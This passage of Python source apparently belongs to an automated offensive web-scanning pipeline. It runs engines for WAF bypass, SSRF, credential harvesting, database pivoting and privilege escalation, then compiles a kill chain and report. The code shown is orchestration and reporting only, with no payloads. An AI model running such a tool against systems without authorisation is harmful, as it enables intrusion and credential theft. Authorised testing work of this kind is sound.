                target_intel["waf_vendor"] = env.get("waf_vendor", "unknown")
                waf_def = hrd.get("waf_defensibility", {})
                block_rate = waf_def.get("block_rate", 0.5)
                if block_rate > 0.7:
                    target_intel["waf_strength"] = "strong"
                elif block_rate > 0.3:
                    target_intel["waf_strength"] = "medium"
                else:
                    target_intel["waf_strength"] = "weak"

            headers_sample = {}
            body_samples = []
            error_samples = []

            for probe in self.probes[:20]:
                resp_headers = probe.get("response_headers", {})
                if resp_headers:
                    headers_sample.update(resp_headers)
                resp_body = probe.get("response_body", "")
                if resp_body and len(resp_body) > 50:
                    body_samples.append(resp_body[:2000])
                if probe.get("error_detail"):
                    error_samples.append(probe["error_detail"][:1000])

            scan_events = []
            for probe in self.probes:
                scan_events.append({
                    "type": probe.get("probe_type", "unknown"),
                    "timestamp": probe.get("timestamp", time.time()),
                    "data": {
                        "status_code": probe.get("status_code", 0),
                        "response_time_ms": probe.get("response_time_ms", 0),
                        "blocked": probe.get("blocked", False),
                        "is_finding": probe.get("vulnerable", False),
                        "body": "",
                    },
                })

            engine = SniperDecisionEngine(
                target=self.target,
                target_intelligence=target_intel,
                log_fn=pipeline_log,
                emit_fn=pipeline_emit,
            )

            self.sniper_decision_report = await asyncio.wait_for(
                engine.execute(
                    findings=self.findings,
                    scan_events=scan_events,
                    headers=headers_sample,
                    body_samples=body_samples[:5],
                    error_samples=error_samples[:5],
                ),
                timeout=60,
            )

            pipeline_emit("sniper_decision_report", self.sniper_decision_report)
            self.phases_completed.append("sniper_decision")
            pipeline_emit("phase_update", {"phase": "sniper_decision", "status": "completed"})
            pipeline_emit("telemetry_update", {"progress": 88, "phase": "sniper_decision"})

        except asyncio.TimeoutError:
            pipeline_log("[DECISION] Engine timeout (60s) â€” partial results preserved", "error", "decision_engine")
            pipeline_emit("phase_update", {"phase": "sniper_decision", "status": "timeout"})
        except Exception as e:
            pipeline_log(f"[DECISION] Engine error: {str(e)[:200]}", "error", "decision_engine")
            pipeline_emit("phase_update", {"phase": "sniper_decision", "status": "error"})

    async def _phase_4d_autonomous_consolidator(self):
        pipeline_emit("phase_update", {"phase": "autonomous_consolidator", "status": "running"})
        pipeline_log(
            "[PHASE 5.7/7] MOTOR 11 â€” AUTONOMOUS CONSOLIDATOR ENGINE â€” "
            "Brutal dictionary + Bayesian decision + Genetic mutation...",
            "error", "motor11"
        )

        try:
            engine = AutonomousConsolidator(
                target=self.target,
                log_fn=pipeline_log,
                emit_fn=pipeline_emit,
            )

            target_intel = {
                "detected_stacks": (self._hypothesis or {}).get("detected_stacks", []),
                "waf_vendor": "",
                "waf_strength": "unknown",
            }
            hrd = self.hacker_reasoning_report or {}
            env = hrd.get("environment", {})
            if env.get("waf_detected"):
                target_intel["waf_vendor"] = env.get("waf_vendor", "unknown")
                waf_def = hrd.get("waf_defensibility", {})
                block_rate = waf_def.get("block_rate", 0.5)
                if block_rate > 0.7:
                    target_intel["waf_strength"] = "strong"
                elif block_rate > 0.3:
                    target_intel["waf_strength"] = "medium"
                else:
                    target_intel["waf_strength"] = "weak"

            self.autonomous_report = await asyncio.wait_for(
                engine.execute_full_cycle(
                    findings=self.findings,
                    probes=self.probes,
                    hypothesis=target_intel,
                    ghost_recon=self.ghost_recon_report,
                    decision_intel=self.decision_intel_report,
                    adversarial_report=self.adversarial_report,
                    chain_intel=self.chain_intel_report,
                    hacker_reasoning=self.hacker_reasoning_report,
                    incident_evidence=self.incident_evidence,
                    risk_score=getattr(self, "_risk_score", 0.0),
                    auto_dump_triggered=getattr(self, "_auto_dump_triggered", False),
                    sniper_decision=self.sniper_decision_report,
                    enterprise_dossier=None,
                    persistence_assessment=self.persistence_assessment,
                ),
                timeout=120,
            )

            confirmed = self.autonomous_report.get("execution_summary", {}).get("confirmed_vulns", 0)
            total_tests = self.autonomous_report.get("execution_summary", {}).get("total_tests", 0)

            pipeline_emit("motor11_report", self.autonomous_report)
            self.phases_completed.append("autonomous_consolidator")
            pipeline_emit("phase_update", {"phase": "autonomous_consolidator", "status": "completed"})
            pipeline_emit("telemetry_update", {"progress": 92, "phase": "autonomous_consolidator"})

            pipeline_log(
                f"[MOTOR 11] COMPLETE â€” {confirmed}/{total_tests} confirmed vulns, "
                f"dictionary: {self.autonomous_report.get('dictionary_total', 0)} payloads",
                "error" if confirmed > 0 else "success", "motor11"
            )

        except asyncio.TimeoutError:
            pipeline_log("[MOTOR 11] Engine timeout (120s) â€” partial results preserved", "error", "motor11")
            pipeline_emit("phase_update", {"phase": "autonomous_consolidator", "status": "timeout"})
        except Exception as e:
            pipeline_log(f"[MOTOR 11] Engine error: {str(e)[:200]}", "error", "motor11")
            pipeline_emit("phase_update", {"phase": "autonomous_consolidator", "status": "error"})

    async def _phase_5_telemetry_report(self):
        pipeline_emit("phase_update", {"phase": "telemetry", "status": "running"})
        pipeline_log("[PHASE 6/6] TELEMETRY â€” Compiling final operation report...", "info", "telemetry")

        vuln_probes = [p for p in self.probes if p.get("vulnerable")]
        crit_findings = [f for f in self.findings if f.get("severity", "").lower() == "critical"]
        high_findings = [f for f in self.findings if f.get("severity", "").lower() == "high"]

        pipeline_log(f"[TELEMETRY] Total findings: {self.counts['total']}", "info", "telemetry")
        pipeline_log(f"[TELEMETRY] CRITICAL: {self.counts['critical']}", "error" if self.counts["critical"] > 0 else "info", "telemetry")
        pipeline_log(f"[TELEMETRY] HIGH: {self.counts['high']}", "error" if self.counts["high"] > 0 else "info", "telemetry")
        pipeline_log(f"[TELEMETRY] MEDIUM: {self.counts['medium']}", "warn" if self.counts["medium"] > 0 else "info", "telemetry")
        pipeline_log(f"[TELEMETRY] Exploitation probes: {len(self.probes)} ({len(vuln_probes)} vulnerable)", "warn", "telemetry")

        if self.sniper_report:
            sr = self.sniper_report
            pipeline_log(
                f"[TELEMETRY] Sniper Engine: {sr.get('vulnerabilities_confirmed', 0)}/{sr.get('total_probes', 0)} confirmed",
                "error" if sr.get("vulnerabilities_confirmed", 0) > 0 else "success",
                "telemetry"
            )

        if self.db_validation_report:
            dbr = self.db_validation_report
            pipeline_log(
                f"[TELEMETRY] DB Validation: {dbr['stack_traces_found']} stack traces, {dbr['db_structure_leaks']} DB leaks, {dbr['sql_error_leaks']} SQL errors",
                "error" if (dbr["stack_traces_found"] + dbr["db_structure_leaks"]) > 0 else "success",
                "telemetry"
            )

        if self.adversarial_report:
            adv = self.adversarial_report
            pipeline_log(
                f"[TELEMETRY] Adversarial FSM: {adv.get('state_transitions', 0)} transitions, "
                f"{adv.get('chain_steps_successful', 0)} chain steps, "
                f"{adv.get('privilege_escalations', 0)} priv-esc, "
                f"{adv.get('real_incidents_confirmed', 0)} real incidents, "
                f"{adv.get('internal_services_discovered', 0)} internal services mapped",
                "error" if adv.get("privilege_escalations", 0) > 0 else "success",
                "telemetry"
            )

        if self.chain_intel_report:
            cir = self.chain_intel_report
            pipeline_log(
                f"[TELEMETRY] Chain Intelligence: {cir.get('total_probes', 0)} probes, "
                f"{cir.get('ssrf_captures_count', 0)} creds captured, "
                f"{cir.get('db_pivots_confirmed', 0)} DB pivots, "
                f"{cir.get('ecommerce_integrity', {}).get('failures', 0)} e-com failures "
                f"({cir.get('ecommerce_integrity', {}).get('db_reflections', 0)} DB reflected)",
                "error" if cir.get("ssrf_captures_count", 0) > 0 else "success",
                "telemetry"
            )

        if self.hacker_reasoning_report:
            hrd = self.hacker_reasoning_report
            pipeline_log(
                f"[TELEMETRY] Hacker Reasoning Dictionary: {hrd.get('playbooks_matched', 0)} playbooks, "
                f"{hrd.get('total_reasoning_steps', 0)} steps, "
                f"{hrd.get('confirmed_probes', 0)}/{hrd.get('total_probes', 0)} confirmed, "
                f"{hrd.get('escalation_paths_count', 0)} escalation paths, "
                f"{hrd.get('critical_chains', 0)} CRITICAL chains",
                "error" if hrd.get("critical_chains", 0) > 0 else "success",
                "telemetry"
            )

        if self.infra_report:
            ir = self.infra_report
            pipeline_log(
                f"[TELEMETRY] SSRF Infra: {ir['confirmed_ssrf']}/{ir['total_requests']} internal services exposed",
                "error" if ir["confirmed_ssrf"] > 0 else "success",
                "telemetry"
            )

        if self.ghost_recon_report:
            gr = self.ghost_recon_report
            pipeline_log(
                f"[TELEMETRY] Ghost Recon (OSINT): {gr.get('total_attack_surface', 0)} surface items, "
                f"{len(gr.get('subdomains', []))} subdomains, "
                f"{len(gr.get('forgotten_paths', []))} forgotten paths, "
                f"confidence: {gr.get('confidence_score', 0):.1%}, zero_footprint=true",
                "warn" if gr.get("total_attack_surface", 0) > 0 else "success",
                "telemetry"
            )

        if self.persistence_assessment:
            pa = self.persistence_assessment
            pipeline_log(
                f"[TELEMETRY] Persistence Assessment: {pa.get('vectors_found', 0)} vectors, "
                f"{pa.get('critical_vectors', 0)} critical â€” {pa.get('assessment', 'N/A')}",
                "error" if pa.get("critical_vectors", 0) > 0 else "success",
                "telemetry"
            )

        if self.executive_report:
            er = self.executive_report
            meta = er.get("metadata", {})
            pipeline_log(
                f"[TELEMETRY] Executive Report: Classification={meta.get('classification', 'N/A')}, "
                f"Key findings: {len(er.get('board_summary', {}).get('key_findings', []))}, "
                f"Recommendations: {len(er.get('strategic_recommendations', []))}",
                "warn" if meta.get("classification") in ("CRITICAL", "HIGH") else "info",
                "telemetry"
            )

        if self.counts["critical"] > 0:
            pipeline_log(
                f"[THREAT] TARGET AT RISK â€” {self.counts['critical']} CRITICAL vulnerabilities require immediate remediation",
                "error", "telemetry"
            )
        elif self.counts["high"] > 0:
            pipeline_log(
                f"[ALERT] {self.counts['high']} HIGH severity findings detected â€” review recommended",
                "warn", "telemetry"
            )
        else:
            pipeline_log("[BLOCK] TARGET HARDENED â€” No critical/high exploitable vectors confirmed", "success", "telemetry")

        self.phases_completed.append("telemetry")
        pipeline_emit("phase_update", {"phase": "telemetry", "status": "completed"})
        pipeline_emit("telemetry_update", {"progress": 100, "phase": "telemetry"})

    def _build_kill_chain(self) -> List[Dict]:
        chain = []

        hrd = self.hacker_reasoning_report or {}
        if self.ghost_recon_report:
            gr = self.ghost_recon_report
            chain.append({
                "phase": "Ghost Recon (Zero-Footprint OSINT)",
                "technique": "Certificate Transparency + Wayback Machine + Passive DNS",
                "target": f"{len(gr.get('subdomains', []))} subdomains, {len(gr.get('forgotten_paths', []))} forgotten paths",
                "success": gr.get("total_attack_surface", 0) > 0,
                "evidence": f"Attack surface: {gr.get('total_attack_surface', 0)} items, confidence: {gr.get('confidence_score', 0):.1%}, zero_footprint=true",
                "feeds_into": "Surface Mapping",
            })

        waf_def = hrd.get("waf_defensibility") or {}
        env = hrd.get("environment") or {}
        has_waf = env.get("waf_detected", False) or waf_def.get("total_probes", 0) > 0
        waf_vendor = env.get("waf_vendor", "Unknown")

        if has_waf:
            rec_fb = hrd.get("recursive_fallback", {})
            adv = self.adversarial_report or {}
            bypassed = (rec_fb.get("mutations_successful", 0) > 0 or
                        adv.get("polymorphic_bypasses", 0) > 0)
            chain.append({
                "phase": "WAF Detection & Bypass",
                "technique": f"WAF Identified: {waf_vendor}",
                "target": self.target,
                "success": bypassed,
                "evidence": (
                    f"High Defensibility: {waf_def.get('blocked_probes', 0)}/{waf_def.get('total_probes', 0)} blocked â†’ Data Drift redirect"
                    if waf_def.get("high_defensibility")
                    else ("WAF bypass confirmed via polymorphic mutations" if bypassed else "WAF blocking probes")
                ),
                "feeds_into": "Subdomain Recon",
            })

        sub_recon = hrd.get("subdomain_recon", {})
        if sub_recon.get("activated"):
            chain.append({
                "phase": "Subdomain Priority Recon",
                "technique": "Admin/Dev subdomain enumeration",
                "target": f"{sub_recon.get('subdomains_tested', 0)} subdomains tested",
                "success": sub_recon.get("auth_bypasses", 0) > 0 or sub_recon.get("source_maps_found", 0) > 0,
                "evidence": f"{sub_recon.get('auth_bypasses', 0)} auth bypasses, {sub_recon.get('source_maps_found', 0)} source maps",
                "feeds_into": "Critical Subdomain Access",
            })

        di = self.decision_intel_report or {}
        if di:
            chain.append({
                "phase": "Decision Intelligence",
                "technique": "Zero-knowledge decision tree",
                "target": f"{di.get('tree_nodes_executed', 0)} nodes executed",
                "success": di.get("total_exploits_confirmed", 0) > 0,
                "evidence": f"{di.get('total_exploits_confirmed', 0)} exploits, {di.get('credential_dumps_successful', 0)} cred dumps, {di.get('pivot_points', 0)} pivots",
                "feeds_into": "Adversarial Exploitation",
            })

        adv = self.adversarial_report or {}
        if adv:
            chain.append({
                "phase": "Adversarial FSM Exploitation",
                "technique": "State machine exploit chain",
                "target": f"{adv.get('chain_steps_total', 0)} chain steps",
                "success": adv.get("chain_steps_successful", 0) > 0,
                "evidence": f"{adv.get('chain_steps_successful', 0)} successful, {adv.get('privilege_escalations', 0)} priv-esc, {adv.get('real_incidents_confirmed', 0)} incidents",
                "feeds_into": "Chain Intelligence",
            })

        ci = self.chain_intel_report or {}
        if ci:
            chain.append({
                "phase": "Chain Intelligence",
                "technique": "SSRF â†’ credential harvest â†’ DB pivot",
                "target": f"{ci.get('total_probes', 0)} probes",
                "success": ci.get("ssrf_captures_count", 0) > 0 or ci.get("db_pivots_confirmed", 0) > 0,
                "evidence": f"{ci.get('ssrf_captures_count', 0)} SSRF captures, {ci.get('db_pivots_confirmed', 0)} DB pivots",
                "feeds_into": "Asset Extraction",
            })

        if hrd:
            chain.append({
                "phase": "Hacker Reasoning Dictionary",
                "technique": "Kill chain playbook + escalation graph",
                "target": f"{hrd.get('playbooks_matched', 0)} playbooks",
                "success": hrd.get("confirmed_probes", 0) > 0 or hrd.get("critical_chains", 0) > 0,
                "evidence": f"{hrd.get('confirmed_probes', 0)} confirmed, {hrd.get('critical_chains', 0)} critical chains",
                "feeds_into": "DB Reflection",
            })

        db_ref = hrd.get("db_reflection", {})
        if db_ref.get("activated"):
            chain.append({
                "phase": "DB Reflection Validation",
                "technique": "SSRF â†’ internal DB/service probing",
                "target": f"{db_ref.get('total_reflections', 0)} reflections tested",
                "success": db_ref.get("confirmed_reflections", 0) > 0,
                "evidence": f"{db_ref.get('confirmed_reflections', 0)} confirmed, {db_ref.get('pii_confirmed', 0)} PII reachable",
            })

        infra = self.infra_report if hasattr(self, 'infra_report') and self.infra_report else {}
        if infra:
            chain.append({
                "phase": "Infrastructure SSRF",
                "technique": "Internal service discovery + data extraction",
                "target": f"{infra.get('vectors_tested', 0)} vectors",
                "success": infra.get("confirmed_ssrf", 0) > 0,
                "evidence": f"{infra.get('confirmed_ssrf', 0)} internal services exposed",
            })

        if self.persistence_assessment:
            pa = self.persistence_assessment
            chain.append({
                "phase": "Persistence Assessment",
                "technique": "Webshell detection + file upload + SSRF file read",
                "target": f"{pa.get('webshell_paths_tested', 0)} paths tested",
                "success": pa.get("critical_vectors", 0) > 0,
                "evidence": f"{pa.get('vectors_found', 0)} vectors, {pa.get('critical_vectors', 0)} critical â€” {pa.get('assessment', 'N/A')}",
            })

        if self.sniper_decision_report:
            sdr = self.sniper_decision_report
            chain.append({
                "phase": "Sniper Decision Engine (APT-5)",
                "technique": "Predictive + Bayesian + Genetic + MultiObjective + DynamicChain",
                "target": f"{sdr.get('predictions', {}).get('total_predictions', 0)} predictions, {sdr.get('bayesian_decisions', {}).get('total_evaluated', 0)} Bayesian evaluations",
                "success": sdr.get("overall_confidence", 0) > 0.5,
                "evidence": f"dominant={sdr.get('dominant_decision', 'NONE')}, confidence={sdr.get('overall_confidence', 0):.1%}",
            })

        return chain

    def _consolidate_ssrf_proofs(self) -> List[Dict]:
        proofs = []

        infra = self.infra_report if hasattr(self, 'infra_report') and self.infra_report else {}
        for detail in infra.get("details", []):
            proofs.append({
                "timestamp": _ts(),
                "vector": detail.get("vector", "ssrf"),
                "endpoint": detail.get("endpoint", ""),
                "param": detail.get("param", ""),
                "internal_target": detail.get("endpoint", ""),
                "status_code": 200,
                "evidence_snippet": f"SSRF vector {detail.get('vector', '')} confirmed at {detail.get('endpoint', '')}[{detail.get('param', '')}]",
                "data_confirmed": True,
            })

        hrd = self.hacker_reasoning_report or {}
        db_ref = hrd.get("db_reflection", {})
        for result in db_ref.get("results", []):
            if result.get("data_reflected"):
                proofs.append({
                    "timestamp": _ts(),
                    "vector": "DB_REFLECTION",
                    "endpoint": result.get("via_endpoint", ""),
                    "param": "ssrf_channel",
                    "internal_target": result.get("service", ""),
                    "status_code": result.get("status_code", 0),
                    "evidence_snippet": f"{result.get('data_type', '')} data reflected from {result.get('service', '')}",
                    "data_confirmed": True,
                })

        ci = self.chain_intel_report or {}
        for ev in ci.get("chain_events", []):
            if ev.get("success") and ("ssrf" in ev.get("technique", "").lower() or "ssrf" in ev.get("phase", "").lower()):
                proofs.append({
                    "timestamp": _ts(),
                    "vector": "CHAIN_INTEL",
                    "endpoint": ev.get("target", ""),
                    "param": ev.get("technique", ""),
                    "internal_target": ev.get("target", ""),
                    "status_code": 200,
                    "evidence_snippet": ev.get("evidence", "")[:100],
                    "data_confirmed": True,
                })

        di = self.decision_intel_report or {}
        for cd in di.get("credential_dumps", []):
            if cd.get("success"):
                proofs.append({
                    "timestamp": _ts(),
                    "vector": "CREDENTIAL_HARVEST",
                    "endpoint": cd.get("via_endpoint", "N/A"),
                    "param": cd.get("via_param", "N/A"),
                    "internal_target": cd.get("service", ""),
                    "status_code": 200,
                    "evidence_snippet": f"Credential dump from {cd.get('service', '')} via {cd.get('via_endpoint', 'direct')}",
                    "data_confirmed": True,
                })

        return proofs

    def _consolidate_exploit_transactions(self) -> List[Dict]:
        txs = []

        if self.sniper_report and "probes" in self.sniper_report:
            for p in self.sniper_report["probes"]:
                txs.append({
                    "phase": "SNIPER",
                    "probe_type": p.get("probe_type", ""),
                    "endpoint": p.get("endpoint", ""),
                    "payload": p.get("payload", ""),
                    "status_code": p.get("status_code", 0),
                    "response_time_ms": p.get("response_time_ms", 0),
                    "verdict": p.get("verdict", ""),
                    "evidence": p.get("evidence", ""),
                })

        for p in self.probes:
            endpoint = p.get("endpoint", "")
            ptype = p.get("probe_type", "")
            if not any(t["endpoint"] == endpoint and t["probe_type"] == ptype for t in txs):
                txs.append({
                    "phase": "PIPELINE",
                    "probe_type": ptype,
                    "endpoint": endpoint,
                    "payload": p.get("payload", ""),
                    "status_code": p.get("status_code", 0),
                    "response_time_ms": p.get("response_time_ms", 0),
                    "verdict": p.get("verdict", ""),
                    "evidence": p.get("evidence", ""),
                })

        adv = self.adversarial_report or {}
        for step in adv.get("exploit_chain", []):
            txs.append({
                "phase": "ADVERSARIAL",
                "probe_type": step.get("class", ""),
                "endpoint": step.get("endpoint", ""),
                "payload": "",
                "status_code": 200 if step.get("success") else 403,
                "response_time_ms": 0,
                "verdict": "EXPLOITED" if step.get("success") else "BLOCKED",
                "evidence": step.get("incident_id", ""),
            })

        ci = self.chain_intel_report or {}
        for ev in ci.get("chain_events", []):
            txs.append({
                "phase": "CHAIN_INTEL",
                "probe_type": ev.get("technique", ""),
                "endpoint": ev.get("target", ""),
                "payload": "",
                "status_code": 200 if ev.get("success") else 403,
                "response_time_ms": 0,
                "verdict": "CONFIRMED" if ev.get("success") else "BLOCKED",
                "evidence": ev.get("evidence", ""),
            })

        return txs

    def _build_report(self) -> Dict:
        return {
            "target": self.target,
            "scan_id": self.scan_id,
            "started_at": self.started_at,
            "completed_at": _ts(),
            "phases_completed": self.phases_completed,
            "counts": self.counts,
            "total_findings": self.counts["total"],
            "total_probes": len(self.probes),
            "vulnerable_probes": sum(1 for p in self.probes if p.get("vulnerable")),
            "findings": self.findings,
            "exposed_assets": self.exposed_assets,
            "probes": self.probes,
            "sniper_report": self.sniper_report,
            "decision_intel_report": self.decision_intel_report,
            "adversarial_report": self.adversarial_report,
            "chain_intel_report": self.chain_intel_report,
            "hacker_reasoning_report": self.hacker_reasoning_report,
            "db_validation_report": self.db_validation_report,
            "infra_report": self.infra_report,
            "incident_evidence": self.incident_evidence,
            "risk_score": self._risk_score,
            "stack_hypothesis": self._hypothesis,
            "auto_dump_triggered": self._auto_dump_triggered,
            "ghost_recon": self.ghost_recon_report,
            "persistence_assessment": self.persistence_assessment,
            "executive_compromise_report": self.executive_report,
            "sniper_decision_report": self.sniper_decision_report,
        }


async def run_pipeline(target: str, scan_id: str = "") -> Dict:
    pipeline = SniperPipeline(target, scan_id)
    return await pipeline.execute()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: python -m scanner.sniper_pipeline <target> [scan_id]"}))
        sys.exit(1)

    target_arg = sys.argv[1]
    scan_id_arg = sys.argv[2] if len(sys.argv) > 2 else ""

    async def main():
        report = await run_pipeline(target_arg, scan_id_arg)
        pipeline_emit("completed", {"status": "done", "counts": report["counts"], "probes": report["total_probes"]})

    asyncio.run(main())
